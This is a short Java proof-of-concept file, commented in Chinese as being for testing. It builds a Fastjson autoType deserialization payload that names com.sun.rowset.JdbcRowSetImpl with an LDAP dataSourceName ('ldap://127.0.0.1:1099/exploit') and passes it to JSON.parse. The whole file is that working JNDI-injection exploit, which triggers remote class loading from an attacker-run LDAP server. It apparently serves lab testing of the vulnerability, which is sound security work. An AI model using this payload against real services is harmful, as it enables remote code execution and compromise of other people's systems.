
//测试用的

package com.example.fastjsonmem.JDBC;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonDemo {
    public static void main(String[] args) {

        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/exploit\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
